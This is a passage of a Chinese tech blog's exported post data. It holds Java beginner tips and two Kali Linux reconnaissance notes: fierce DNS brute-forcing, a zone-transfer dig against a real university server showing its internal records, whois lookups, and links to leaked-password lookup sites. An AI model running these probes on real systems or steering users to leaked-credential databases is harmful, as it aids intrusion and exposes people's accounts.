<code>synchronized</code></font></td><td><font>能<code></code></font></td></tr><tr><td><font>返回类型</font></td><td><font>没有返回值，没有void<code></code></font></td><td><code><font>有返回值，或者void</font></code></td></tr><tr><td><font>命名</font></td><td><font>和类名相同；通常为名词，大写开头</font></td><td><font>通常代表一个动词的意思，小写开头</font></td></tr><tr><td><code><font>this</font></code></td><td><font>指向同一个类中另外一个构造器，在第一行</font></td><td><font>指向当前类的一个实例，不能用于静态方法</font></td></tr><tr><td><code><font>super</font></code></td><td><font>调用父类的构造器，在第一行</font></td><td><font>调用父类中一个重载的方法</font></td></tr><tr><td><font>继承</font></td><td><font>构造器不能被继承</font></td><td><font>方法可以被继承</font></td></tr><tr><td><font>编译器自动加入一个缺省的构造器</font></td><td><font>自动加入（如果没有）</font></td><td><font>不支持</font></td></tr><tr><td><font>编译器自动加入一个缺省的调用到超类的构造器</font></td><td><font>自动加入（如果没有）</font></td><td><font>不支持</font></td></tr></tbody></table>\n# Java\n* 输入args\n# Eclipse\n* `alt + /` 自动补全\n* `ctrl+shift+F` 格式化代码\n* ","source":"_posts/Java初学者小经验.md","raw":"---\ntitle: Java初学者小经验\ndate: 2016-09-30 12:47:27\ntags: Java\ncategories: Java\n---\n# Java初学者小技巧\n我是个Java新手，总结了一些经验\n\n## 构造器和方法的区别\n<table><tbody><tr></tr><tr><th><font>主题</font></th><th><font>构造器</font></th><th><font>方法</font></th></tr><tr><td><font>功能</font></td><td><font>建立一个类的实例</font></td><td><font>java功能语句</font></td></tr><tr><td><font>修饰</font></td><td><font>不能用<code>bstract</code>, <code>final</code>, <code>native</code>, <code>static</code>, or <code>synchronized</code></font></td><td><font>能<code></code></font></td></tr><tr><td><font>返回类型</font></td><td><font>没有返回值，没有void<code></code></font></td><td><code><font>有返回值，或者void</font></code></td></tr><tr><td><font>命名</font></td><td><font>和类名相同；通常为名词，大写开头</font></td><td><font>通常代表一个动词的意思，小写开头</font></td></tr><tr><td><code><font>this</font></code></td><td><font>指向同一个类中另外一个构造器，在第一行</font></td><td><font>指向当前类的一个实例，不能用于静态方法</font></td></tr><tr><td><code><font>super</font></code></td><td><font>调用父类的构造器，在第一行</font></td><td><font>调用父类中一个重载的方法</font></td></tr><tr><td><font>继承</font></td><td><font>构造器不能被继承</font></td><td><font>方法可以被继承</font></td></tr><tr><td><font>编译器自动加入一个缺省的构造器</font></td><td><font>自动加入（如果没有）</font></td><td><font>不支持</font></td></tr><tr><td><font>编译器自动加入一个缺省的调用到超类的构造器</font></td><td><font>自动加入（如果没有）</font></td><td><font>不支持</font></td></tr></tbody></table>\n# Java\n* 输入args\n# Eclipse\n* `alt + /` 自动补全\n* `ctrl+shift+F` 格式化代码\n* ","slug":"Java初学者小经验","published":1,"updated":"2016-10-05T10:45:30.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciubisk9i00093sondq3kxxeh","content":"<h1 id=\"Java初学者小技巧\"><a href=\"#Java初学者小技巧\" class=\"headerlink\" title=\"Java初学者小技巧\"></a>Java初学者小技巧</h1><p>我是个Java新手，总结了一些经验</p>\n<h2 id=\"构造器和方法的区别\"><a href=\"#构造器和方法的区别\" class=\"headerlink\" title=\"构造器和方法的区别\"></a>构造器和方法的区别</h2><p><table><tbody><tr></tr><tr><th><font>主题</font></th><th><font>构造器</font></th><th><font>方法</font></th></tr><tr><td><font>功能</font></td><td><font>建立一个类的实例</font></td><td><font>java功能语句</font></td></tr><tr><td><font>修饰</font></td><td><font>不能用<code>bstract</code>, <code>final</code>, <code>native</code>, <code>static</code>, or <code>synchronized</code></font></td><td><font>能<code></code></font></td></tr><tr><td><font>返回类型</font></td><td><font>没有返回值，没有void<code></code></font></td><td><code><font>有返回值，或者void</font></code></td></tr><tr><td><font>命名</font></td><td><font>和类名相同；通常为名词，大写开头</font></td><td><font>通常代表一个动词的意思，小写开头</font></td></tr><tr><td><code><font>this</font></code></td><td><font>指向同一个类中另外一个构造器，在第一行</font></td><td><font>指向当前类的一个实例，不能用于静态方法</font></td></tr><tr><td><code><font>super</font></code></td><td><font>调用父类的构造器，在第一行</font></td><td><font>调用父类中一个重载的方法</font></td></tr><tr><td><font>继承</font></td><td><font>构造器不能被继承</font></td><td><font>方法可以被继承</font></td></tr><tr><td><font>编译器自动加入一个缺省的构造器</font></td><td><font>自动加入（如果没有）</font></td><td><font>不支持</font></td></tr><tr><td><font>编译器自动加入一个缺省的调用到超类的构造器</font></td><td><font>自动加入（如果没有）</font></td><td><font>不支持</font></td></tr></tbody></table></p>\n<h1 id=\"Java\"><a href=\"#Java\" class=\"headerlink\" title=\"Java\"></a>Java</h1><ul>\n<li>输入args<h1 id=\"Eclipse\"><a href=\"#Eclipse\" class=\"headerlink\" title=\"Eclipse\"></a>Eclipse</h1></li>\n<li><code>alt + /</code> 自动补全</li>\n<li><code>ctrl+shift+F</code> 格式化代码</li>\n<li></li>\n</ul>\n","excerpt":"","more":"<h1 id=\"Java初学者小技巧\"><a href=\"#Java初学者小技巧\" class=\"headerlink\" title=\"Java初学者小技巧\"></a>Java初学者小技巧</h1><p>我是个Java新手，总结了一些经验</p>\n<h2 id=\"构造器和方法的区别\"><a href=\"#构造器和方法的区别\" class=\"headerlink\" title=\"构造器和方法的区别\"></a>构造器和方法的区别</h2><p><table><tbody><tr></tr><tr><th><font>主题</font></th><th><font>构造器</font></th><th><font>方法</font></th></tr><tr><td><font>功能</font></td><td><font>建立一个类的实例</font></td><td><font>java功能语句</font></td></tr><tr><td><font>修饰</font></td><td><font>不能用<code>bstract</code>, <code>final</code>, <code>native</code>, <code>static</code>, or <code>synchronized</code></font></td><td><font>能<code></code></font></td></tr><tr><td><font>返回类型</font></td><td><font>没有返回值，没有void<code></code></font></td><td><code><font>有返回值，或者void</font></code></td></tr><tr><td><font>命名</font></td><td><font>和类名相同；通常为名词，大写开头</font></td><td><font>通常代表一个动词的意思，小写开头</font></td></tr><tr><td><code><font>this</font></code></td><td><font>指向同一个类中另外一个构造器，在第一行</font></td><td><font>指向当前类的一个实例，不能用于静态方法</font></td></tr><tr><td><code><font>super</font></code></td><td><font>调用父类的构造器，在第一行</font></td><td><font>调用父类中一个重载的方法</font></td></tr><tr><td><font>继承</font></td><td><font>构造器不能被继承</font></td><td><font>方法可以被继承</font></td></tr><tr><td><font>编译器自动加入一个缺省的构造器</font></td><td><font>自动加入（如果没有）</font></td><td><font>不支持</font></td></tr><tr><td><font>编译器自动加入一个缺省的调用到超类的构造器</font></td><td><font>自动加入（如果没有）</font></td><td><font>不支持</font></td></tr></tbody></table></p>\n<h1 id=\"Java\"><a href=\"#Java\" class=\"headerlink\" title=\"Java\"></a>Java</h1><ul>\n<li>输入args<h1 id=\"Eclipse\"><a href=\"#Eclipse\" class=\"headerlink\" title=\"Eclipse\"></a>Eclipse</h1></li>\n<li><code>alt + /</code> 自动补全</li>\n<li><code>ctrl+shift+F</code> 格式化代码</li>\n<li></li>\n</ul>\n"},{"title":"Kali系列——信息收集阶段（二）","id":"8","updated":"2016-08-05T20:13:14.000Z","date":"2016-08-01T22:20:17.000Z","_content":"<!-- more --> \n## fierece\n暴力破解dns解析\n```bash\nroot@kali:~# fierce -dns dbstye.net\n\nTrying zone transfer first...\n\nUnsuccessful in zone transfer (it was worth a shot)\nOkay, trying the good old fashioned way... brute force\n\nChecking for wildcard DNS...\nNope. Good.\nNow performing 2280 test(s)...\n```\n应用字典\n\n```bash\nroot@kali:~# fierce -dns dbstye.net -wordlist myWordlist.txt\n```\n\n## 社工库\n部分需翻墙\n\n* http://www.xiumima.com/\n\n* http://cha.hxsec.com/\n\n* http://findmima.com\n\n* http://163.donothackme.club/\n\n* http://www.rallyindonesia.com/","source":"_posts/Kali系列——信息收集阶段（二）.md","raw":"---\ntitle: Kali系列——信息收集阶段（二）\ntags: 'Hack'\npermalink: kalixi-lie-xin-xi-shou-ji-jie-duan-yi\nid: 8\nupdated: '2016-08-05 21:13:14'\ndate: 2016-08-01 23:20:17\n---\n<!-- more --> \n## fierece\n暴力破解dns解析\n```bash\nroot@kali:~# fierce -dns dbstye.net\n\nTrying zone transfer first...\n\nUnsuccessful in zone transfer (it was worth a shot)\nOkay, trying the good old fashioned way... brute force\n\nChecking for wildcard DNS...\nNope. Good.\nNow performing 2280 test(s)...\n```\n应用字典\n\n```bash\nroot@kali:~# fierce -dns dbstye.net -wordlist myWordlist.txt\n```\n\n## 社工库\n部分需翻墙\n\n* http://www.xiumima.com/\n\n* http://cha.hxsec.com/\n\n* http://findmima.com\n\n* http://163.donothackme.club/\n\n* http://www.rallyindonesia.com/","slug":"kalixi-lie-xin-xi-shou-ji-jie-duan-yi","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ciubisk9k000a3son3bnvzhux","content":"<a id=\"more\"></a> \n<h2 id=\"fierece\"><a href=\"#fierece\" class=\"headerlink\" title=\"fierece\"></a>fierece</h2><p>暴力破解dns解析<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali:~<span class=\"comment\"># fierce -dns dbstye.net</span></div><div class=\"line\"></div><div class=\"line\">Trying zone transfer first...</div><div class=\"line\"></div><div class=\"line\">Unsuccessful <span class=\"keyword\">in</span> zone transfer (it was worth a shot)</div><div class=\"line\">Okay, trying the good old fashioned way... brute force</div><div class=\"line\"></div><div class=\"line\">Checking <span class=\"keyword\">for</span> wildcard DNS...</div><div class=\"line\">Nope. Good.</div><div class=\"line\">Now performing 2280 <span class=\"built_in\">test</span>(s)...</div></pre></td></tr></table></figure></p>\n<p>应用字典</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali:~<span class=\"comment\"># fierce -dns dbstye.net -wordlist myWordlist.txt</span></div></pre></td></tr></table></figure>\n<h2 id=\"社工库\"><a href=\"#社工库\" class=\"headerlink\" title=\"社工库\"></a>社工库</h2><p>部分需翻墙</p>\n<ul>\n<li><p><a href=\"http://www.xiumima.com/\" target=\"_blank\" rel=\"external\">http://www.xiumima.com/</a></p>\n</li>\n<li><p><a href=\"http://cha.hxsec.com/\" target=\"_blank\" rel=\"external\">http://cha.hxsec.com/</a></p>\n</li>\n<li><p><a href=\"http://findmima.com\" target=\"_blank\" rel=\"external\">http://findmima.com</a></p>\n</li>\n<li><p><a href=\"http://163.donothackme.club/\" target=\"_blank\" rel=\"external\">http://163.donothackme.club/</a></p>\n</li>\n<li><p><a href=\"http://www.rallyindonesia.com/\" target=\"_blank\" rel=\"external\">http://www.rallyindonesia.com/</a></p>\n</li>\n</ul>\n","excerpt":"","more":"<h2 id=\"fierece\"><a href=\"#fierece\" class=\"headerlink\" title=\"fierece\"></a>fierece</h2><p>暴力破解dns解析<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali:~<span class=\"comment\"># fierce -dns dbstye.net</span></div><div class=\"line\"></div><div class=\"line\">Trying zone transfer first...</div><div class=\"line\"></div><div class=\"line\">Unsuccessful <span class=\"keyword\">in</span> zone transfer (it was worth a shot)</div><div class=\"line\">Okay, trying the good old fashioned way... brute force</div><div class=\"line\"></div><div class=\"line\">Checking <span class=\"keyword\">for</span> wildcard DNS...</div><div class=\"line\">Nope. Good.</div><div class=\"line\">Now performing 2280 <span class=\"built_in\">test</span>(s)...</div></pre></td></tr></table></figure></p>\n<p>应用字典</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali:~<span class=\"comment\"># fierce -dns dbstye.net -wordlist myWordlist.txt</span></div></pre></td></tr></table></figure>\n<h2 id=\"社工库\"><a href=\"#社工库\" class=\"headerlink\" title=\"社工库\"></a>社工库</h2><p>部分需翻墙</p>\n<ul>\n<li><p><a href=\"http://www.xiumima.com/\">http://www.xiumima.com/</a></p>\n</li>\n<li><p><a href=\"http://cha.hxsec.com/\">http://cha.hxsec.com/</a></p>\n</li>\n<li><p><a href=\"http://findmima.com\">http://findmima.com</a></p>\n</li>\n<li><p><a href=\"http://163.donothackme.club/\">http://163.donothackme.club/</a></p>\n</li>\n<li><p><a href=\"http://www.rallyindonesia.com/\">http://www.rallyindonesia.com/</a></p>\n</li>\n</ul>"},{"title":"Kali系列——信息收集阶段（一）","id":"6","updated":"2016-08-05T20:13:28.000Z","date":"2016-07-30T16:48:20.000Z","_content":"\n记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声：\n>进谷歌 找注入 没注入 就旁注 没旁注 用0day 没0day 猜目录 没目录 就嗅探\n\n>爆账户 找后台 传小马 放大马 拿权限 挂页面  放暗连 清数据 拿不下 去自杀 死不了 继续来 查资料 去社工！\n\n其实，我觉得渗透测试无论怎么变，不外乎这几点：\n\n>信息收集阶段->漏洞检测阶段->漏洞利用阶段->持久化后门阶段\n\n最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。\n<!-- more --> \n# 信息收集阶段\n## DNS信息\n其实DNS信息收集阶段用两个Linux系统自带工具即可完成。\n\n### nslookup\n\n此命令，可以快速查处ip地址\n```bash\n ✘ ivan@Ivan~ nslookup zhihu.com\nServer:\t\t114.114.114.114\nAddress:\t114.114.114.114#53\n\nNon-authoritative answer:\nName:\tzhihu.com\nAddress: 54.223.189.245\n```\n\n当然也可以指定dns查询服务器：\n```bash\nivan@Ivan ~ nslookup -type=ns zhihu.com 8.8.8.8\nServer:\t\t8.8.8.8\nAddress:\t8.8.8.8#53\n\nNon-authoritative answer:\nzhihu.com\tnameserver = ns3.dnsv4.com.\nzhihu.com\tnameserver = ns4.dnsv4.com.\n\nAuthoritative answers can be found from:\n```\n### dig\ndig真是个好工具，甚至可以找出DNS域传送漏洞。下面举一个例子，也是乌云网曝光过的，由于篇幅问题，精简了很多内容：\n```bash\nivan@Ivan  ~  dig @dns.csust.edu.cn csust.edu.cn axfr\n\n; <<>> DiG 9.8.3-P1 <<>> @dns.csust.edu.cn csust.edu.cn axfr\n; (1 server found)\n;; global options: +cmd\ncsust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400\ncsust.edu.cn.\t\t86400\tIN\tNS\tdns.csust.edu.cn.\ncsust.edu.cn.\t\t86400\tIN\tNS\tdns2.csust.edu.cn.\ncsust.edu.cn.\t\t86400\tIN\tA\t113.240.233.146\ncsust.edu.cn.\t\t86400\tIN\tA\t210.43.192.8\ncsust.edu.cn.\t\t86400\tIN\tA\t210.43.192.18\ncsust.edu.cn.\t\t86400\tIN\tMX\t5 mxbiz1.qq.com.\ncsust.edu.cn.\t\t86400\tIN\tMX\t10 mxbiz2.qq.com.\ncsust.edu.cn.\t\t86400\tIN\tAAAA\t2001:da8:d002::d22b:c008\n3g.csust.edu.cn.\t86400\tIN\tA\t113.240.233.6\napp.csust.edu.cn.\t86400\tIN\tA\t113.240.233.11\napp7.csust.edu.cn.\t86400\tIN\tA\t222.240.152.227\napp8.csust.edu.cn.\t86400\tIN\tA\t113.240.233.8\narchives.csust.edu.cn.\t86400\tIN\tA\t222.240.152.232\nbid.csust.edu.cn.\t86400\tIN\tCNAME\tjtcloud.csust.edu.cn.\nbw.csust.edu.cn.\t86400\tIN\tA\t10.255.194.20\ncas.csust.edu.cn.\t86400\tIN\tA\t210.43.198.1\ncslgqkzx.csust.edu.cn.\t86400\tIN\tA\t210.43.188.80\ncslgxbsk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ncslgxbzk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ncwcx.csust.edu.cn.\t86400\tIN\tA\t10.22.14.252\ncxlt.csust.edu.cn.\t86400\tIN\tA\t222.240.152.203\ndkxnsyzx.csust.edu.cn.\t86400\tIN\tA\t222.240.152.200\ndlkjxb.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ndns.csust.edu.cn.\t86400\tIN\tA\t210.43.192.8\ncsust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400\n;; Query time: 62 msec\n;; SERVER: 210.43.192.8#53(210.43.192.8)\n;; WHEN: Sat Jul 30 20:18:47 2016\n;; XFR size: 112 records (messages 1, bytes 2369)\n```\n可以看到，各种信息，从A、cname到MX全部暴露无遗。\n如果不存在该漏洞则会被服务器拒绝查询请求。\n\n```bash\nivan@Ivan ~ dig @dns4.tju.edu.cn tju.edu.cn axfr\n; <<>> DiG 9.8.3-P1 <<>> @dns4.tju.edu.cn tju.edu.cn axfr\n; (1 server found)\n;; global options: +cmd\n; Transfer failed.\n```\n\n### whois\nwhois查询，不多解释了\n\n```bash\nivan@Ivan ~ whois yfgeek.com\n\nWhois Server Version 2.0\n\nDomain names in the .com and .net domains can now be registered\nwith many different competing registrars. Go to http://www.internic.net\nfor detailed information.\n\n   Domain Name: YFGEEK.COM\n   Registrar: GODADDY.COM, LLC\n   Sponsoring Registrar IANA ID: 146\n   Whois Server: whois.godaddy.com\n   Referral URL: http://www.godaddy.com\n   Name Server: F1G1NS1.DNSPOD.NET\n   Name Server: F1G1NS2.DNSPOD.NET\n   Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited\n   Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited\n   Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n   Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited\n   Updated Date: 21-apr-2016\n   Creation Date: 23-nov-2012\n   Expiration Date: 23-nov-2017\n\n```\n","source":"_posts/Kali系列——信息收集阶段（一）.md","raw":"---\ntitle: Kali系列——信息收集阶段（一）\ntags: 'Hack'\npermalink: hack1\nid: 6\nupdated: '2016-08-05 21:13:28'\ndate: 2016-07-30 17:48:20\n---\n\n记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声：\n>进谷歌 找注入 没注入 就旁注 没旁注 用0day 没0day 猜目录 没目录 就嗅探\n\n>爆账户 找后台 传小马 放大马 拿权限 挂页面  放暗连 清数据 拿不下 去自杀 死不了 继续来 查资料 去社工！\n\n其实，我觉得渗透测试无论怎么变，不外乎这几点：\n\n>信息收集阶段->漏洞检测阶段->漏洞利用阶段->持久化后门阶段\n\n最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。\n<!-- more --> \n# 信息收集阶段\n## DNS信息\n其实DNS信息收集阶段用两个Linux系统自带工具即可完成。\n\n### nslookup\n\n此命令，可以快速查处ip地址\n```bash\n ✘ ivan@Ivan~ nslookup zhihu.com\nServer:\t\t114.114.114.114\nAddress:\t114.114.114.114#53\n\nNon-authoritative answer:\nName:\tzhihu.com\nAddress: 54.223.189.245\n```\n\n当然也可以指定dns查询服务器：\n```bash\nivan@Ivan ~ nslookup -type=ns zhihu.com 8.8.8.8\nServer:\t\t8.8.8.8\nAddress:\t8.8.8.8#53\n\nNon-authoritative answer:\nzhihu.com\tnameserver = ns3.dnsv4.com.\nzhihu.com\tnameserver = ns4.dnsv4.com.\n\nAuthoritative answers can be found from:\n```\n### dig\ndig真是个好工具，甚至可以找出DNS域传送漏洞。下面举一个例子，也是乌云网曝光过的，由于篇幅问题，精简了很多内容：\n```bash\nivan@Ivan  ~  dig @dns.csust.edu.cn csust.edu.cn axfr\n\n; <<>> DiG 9.8.3-P1 <<>> @dns.csust.edu.cn csust.edu.cn axfr\n; (1 server found)\n;; global options: +cmd\ncsust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400\ncsust.edu.cn.\t\t86400\tIN\tNS\tdns.csust.edu.cn.\ncsust.edu.cn.\t\t86400\tIN\tNS\tdns2.csust.edu.cn.\ncsust.edu.cn.\t\t86400\tIN\tA\t113.240.233.146\ncsust.edu.cn.\t\t86400\tIN\tA\t210.43.192.8\ncsust.edu.cn.\t\t86400\tIN\tA\t210.43.192.18\ncsust.edu.cn.\t\t86400\tIN\tMX\t5 mxbiz1.qq.com.\ncsust.edu.cn.\t\t86400\tIN\tMX\t10 mxbiz2.qq.com.\ncsust.edu.cn.\t\t86400\tIN\tAAAA\t2001:da8:d002::d22b:c008\n3g.csust.edu.cn.\t86400\tIN\tA\t113.240.233.6\napp.csust.edu.cn.\t86400\tIN\tA\t113.240.233.11\napp7.csust.edu.cn.\t86400\tIN\tA\t222.240.152.227\napp8.csust.edu.cn.\t86400\tIN\tA\t113.240.233.8\narchives.csust.edu.cn.\t86400\tIN\tA\t222.240.152.232\nbid.csust.edu.cn.\t86400\tIN\tCNAME\tjtcloud.csust.edu.cn.\nbw.csust.edu.cn.\t86400\tIN\tA\t10.255.194.20\ncas.csust.edu.cn.\t86400\tIN\tA\t210.43.198.1\ncslgqkzx.csust.edu.cn.\t86400\tIN\tA\t210.43.188.80\ncslgxbsk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ncslgxbzk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ncwcx.csust.edu.cn.\t86400\tIN\tA\t10.22.14.252\ncxlt.csust.edu.cn.\t86400\tIN\tA\t222.240.152.203\ndkxnsyzx.csust.edu.cn.\t86400\tIN\tA\t222.240.152.200\ndlkjxb.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ndns.csust.edu.cn.\t86400\tIN\tA\t210.43.192.8\ncsust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400\n;; Query time: 62 msec\n;; SERVER: 210.43.192.8#53(210.43.192.8)\n;; WHEN: Sat Jul 30 20:18:47 2016\n;; XFR size: 112 records (messages 1, bytes 2369)\n```\n可以看到，各种信息，从A、cname到MX全部暴露无遗。\n如果不存在该漏洞则会被服务器拒绝查询请求。\n\n```bash\nivan@Ivan ~ dig @dns4.tju.edu.cn tju.edu.cn axfr\n; <<>> DiG 9.8.3-P1 <<>> @dns4.tju.edu.cn tju.edu.cn axfr\n; (1 server found)\n;; global options: +cmd\n; Transfer failed.\n```\n\n### whois\nwhois查询，不多解释了\n\n```bash\nivan@Ivan ~ whois yfgeek.com\n\nWhois Server Version 2.0\n\nDomain names in the .com and .net domains can now be registered\nwith many different competing registrars. Go to http://www.internic.net\nfor detailed information.\n\n   Domain Name: YFGEEK.COM\n   Registrar: GODADDY.COM, LLC\n   Sponsoring Registrar IANA ID: 146\n   Whois Server: whois.godaddy.com\n   Referral URL: http://www.godaddy.com\n   Name Server: F1G1NS1.DNSPOD.NET\n   Name Server: F1G1NS2.DNSPOD.NET\n   Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited\n   Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited\n   Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n   Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited\n   Updated Date: 21-apr-2016\n   Creation Date: 23-nov-2012\n   Expiration Date: 23-nov-2017\n\n```\n","slug":"hack1","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ciubisk9p000e3son57xyio31","content":"<p>记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声：</p>\n<blockquote>\n<p>进谷歌 找注入 没注入 就旁注 没旁注 用0day 没0day 猜目录 没目录 就嗅探</p>\n<p>爆账户 找后台 传小马 放大马 拿权限 挂页面  放暗连 清数据 拿不下 去自杀 死不了 继续来 查资料 去社工！</p>\n</blockquote>\n<p>其实，我觉得渗透测试无论怎么变，不外乎这几点：</p>\n<blockquote>\n<p>信息收集阶段-&gt;漏洞检测阶段-&gt;漏洞利用阶段-&gt;持久化后门阶段</p>\n</blockquote>\n<p>最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。<br><a id=\"more\"></a> </p>\n<h1 id=\"信息收集阶段\"><a href=\"#信息收集阶段\" class=\"headerlink\" title=\"信息收集阶段\"></a>信息收集阶段</h1><h2 id=\"DNS信息\"><a href=\"#DNS信息\" class=\"headerlink\" title=\"DNS信息\"></a>DNS信息</h2><p>其实DNS信息收集阶段用两个Linux系统自带工具即可完成。</p>\n<h3 id=\"nslookup\"><a href=\"#nslookup\" class=\"headerlink\" title=\"nslookup\"></a>nslookup</h3><p>此命令，可以快速查处ip地址<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"> ✘ ivan@Ivan~ nslookup zhihu.com</div><div class=\"line\">Server:\t\t114.114.114.114</div><div class=\"line\">Address:\t114.114.114.114<span class=\"comment\">#53</span></div><div class=\"line\"></div><div class=\"line\">Non-authoritative answer:</div><div class=\"line\">Name:\tzhihu.com</div><div class=\"line\">Address: 54.223.189.245</div></pre></td></tr></table></figure></p>\n<p>当然也可以指定dns查询服务器：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ nslookup -type=ns zhihu.com 8.8.8.8</div><div class=\"line\">Server:\t\t8.8.8.8</div><div class=\"line\">Address:\t8.8.8.8<span class=\"comment\">#53</span></div><div class=\"line\"></div><div class=\"line\">Non-authoritative answer:</div><div class=\"line\">zhihu.com\tnameserver = ns3.dnsv4.com.</div><div class=\"line\">zhihu.com\tnameserver = ns4.dnsv4.com.</div><div class=\"line\"></div><div class=\"line\">Authoritative answers can be found from:</div></pre></td></tr></table></figure></p>\n<h3 id=\"dig\"><a href=\"#dig\" class=\"headerlink\" title=\"dig\"></a>dig</h3><p>dig真是个好工具，甚至可以找出DNS域传送漏洞。下面举一个例子，也是乌云网曝光过的，由于篇幅问题，精简了很多内容：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan  ~  dig @dns.csust.edu.cn csust.edu.cn axfr</div><div class=\"line\"></div><div class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @dns.csust.edu.cn csust.edu.cn axfr</div><div class=\"line\">; (1 server found)</div><div class=\"line\">;; global options: +cmd</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tNS\tdns.csust.edu.cn.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tNS\tdns2.csust.edu.cn.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t113.240.233.146</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t210.43.192.8</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t210.43.192.18</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tMX\t5 mxbiz1.qq.com.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tMX\t10 mxbiz2.qq.com.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tAAAA\t2001:da8:d002::d22b:c008</div><div class=\"line\">3g.csust.edu.cn.\t86400\tIN\tA\t113.240.233.6</div><div class=\"line\">app.csust.edu.cn.\t86400\tIN\tA\t113.240.233.11</div><div class=\"line\">app7.csust.edu.cn.\t86400\tIN\tA\t222.240.152.227</div><div class=\"line\">app8.csust.edu.cn.\t86400\tIN\tA\t113.240.233.8</div><div 